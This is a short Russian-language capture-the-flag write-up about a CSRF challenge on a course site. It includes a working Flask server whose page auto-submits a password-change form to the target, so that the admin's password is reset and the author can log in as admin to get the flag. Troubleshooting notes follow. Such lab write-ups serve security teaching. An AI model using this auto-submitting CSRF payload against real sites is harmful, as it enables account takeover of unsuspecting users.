Название отсылает нас к уязвимости с названием CSRF. Почитать про нее можно [здесь](https://portswigger.net/web-security/csrf).

Конкретно здесь уязвимое место - это форма смены пароля. Делаем сервер с автосабмит формой на смену пароля, кидаем ссылку админу, он по ней переходит, меняет свой пароль, мы логинимся под его учеткой и получаем флаг.

Вот простенький сервер на фласке, который делает эту задачу:

```python
from flask import Flask

app = Flask(__name__)

@app.route("/")
def hello_world():
    return """
        <form action="https://cats.is-course.ru/settings" method="POST">
            <input name="password" value="345">
            <input name="confirm-password" value="345">
        </form>
        <script>
            document.forms[0].submit()
        </script>
    """

if __name__ == "__main__":
    app.run("0.0.0.0", 8080)
```

Когда я делал, у меня были следубщие проблемы:
- Хост был на http, а мой сервер на https и из-за этого не получалось сходить по форме админу. Сейчас вроде бы домен на https, поэтому такой проблемы быть не должно
- Была проблема с хостами с доменами уровня выше, например, kukakur.keenetic.link, ну или vdi.host.mipt. Сейчас хз, пофиксили или нет.